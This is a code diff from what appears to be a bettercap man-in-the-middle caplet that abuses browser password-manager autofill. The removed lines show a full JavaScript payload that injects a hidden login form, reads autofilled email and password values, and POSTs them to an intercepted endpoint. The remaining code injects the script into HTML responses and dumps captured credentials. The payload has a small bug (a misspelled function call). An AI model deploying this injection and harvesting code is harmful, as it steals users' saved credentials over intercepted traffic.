@@ -9,66 +9,12 @@
  * - POST such credentials to /login-man-abuser, given we control the HTTP traffic, we'll intercept this request.
  * - Intercept request, dump credentials, drop client to 404.
  */
-var AbuserJavascript = 
-'var injectForm = function(visible) {' + "\n" +
-'  var container = document.createElement("div");' + "\n" +
-'  if (!visible){' + "\n" +
-'    container.style.display = "none";' + "\n" +
-'  }' + "\n" +
-'  var form = document.createElement("form");' + "\n" +
-'  form.attributes.autocomplete = "on";' + "\n" +
-'  var emailInput = document.createElement("input");' + "\n" +
-'  emailInput.attributes.vcard_name = "vCard.Email";' + "\n" +
-'  emailInput.id = "email";' + "\n" +
-'  emailInput.type = "email";' + "\n" +
-'  emailInput.name = "email";' + "\n" +
-'  form.appendChild(emailInput);' + "\n" +
-'  var passwordInput = document.createElement("input");' + "\n" +
-'  passwordInput.id = "password";' + "\n" +
-'  passwordInput.type = "password";' + "\n" +
-'  passwordInput.name = "password";' + "\n" +
-'  form.appendChild(passwordInput);' + "\n" +
-'  container.appendChild(form);' + "\n" +
-'  document.body.appendChild(container);' + "\n" +
-'};' + "\n" +
-'' + "\n" +
-'var doPOST = function(data) {' + "\n" +
-'  var xhr = new XMLHttpRequest();' + "\n" +
-'' + "\n" +
-'  xhr.open("POST", "/login-man-abuser");' + "\n" +
-'  xhr.setRequestHeader("Content-Type", "application/json");' + "\n" +
-'  xhr.onload = function() {' + "\n" +
-'    console.log("Enjoy your coffee!");' + "\n" +
-'  };' + "\n" +
-'' + "\n" +
-'  xhr.send(JSON.stringify(data));' + "\n" +
-'};' + "\n" +
-'' + "\n" +
-'var sniffInputField = function(fieldId){' + "\n" +
-'  var inputElement = document.getElementById(fieldId);' + "\n" +
-'  if (inputElement.value.length){' + "\n" +
-'    return {fieldId: inputElement.value};' + "\n" +
-'  }' + "\n" +
-'  window.setTimeout(sniffInputField, 200, fieldId);  // wait for 200ms' + "\n" +
-'};' + "\n" +
-'' + "\n" +
-'var sniffInputFields = function(){' + "\n" +
-'  var inputs = document.getElementsByTagName("input");' + "\n" +
-'  data = {};' + "\n" +
-'  for (var i = 0; i < inputs.length; i++) {' + "\n" +
-'    console.log("Will try to sniff element with id: " + inputs[i].id);' + "\n" +
-'    output = stringsniffInputField(inputs[i].id);' + "\n" +
-'    data = Object.assign({}, data, output);' + "\n" +
-'  }' + "\n" +
-'  doPOST(data);' + "\n" +
-'};' + "\n" +
-'' + "\n" +
-'var sniffFormInfo = function(visible) {' + "\n" +
-'  injectForm(visible);' + "\n" +
-'  sniffInputFields();' + "\n" +
-'};' + "\n" +
-'' + "\n" +
-'sniffFormInfo(false);';
+var AbuserJavascript = "";
+
+function onLoad() {
+    console.log( "Loading abuser code from caplets/login-man-abuser.js" );
+    AbuserJavascript = readFile("caplets/login-man-abuser.js")
+}
 
 // here we intercept the ajax POST request with leaked credentials.
 function onRequest(req, res) {
@@ -88,6 +34,7 @@ function onRequest(req, res) {
 function onResponse(req, res) {
     if( res.ContentType.indexOf('text/html') == 0 ){
         var body = res.ReadBody();
+        console.log(AbuserJavascript);
         if( body.indexOf('</head>') != -1 ) {
             res.Body = body.replace( 
                 '</head>', 
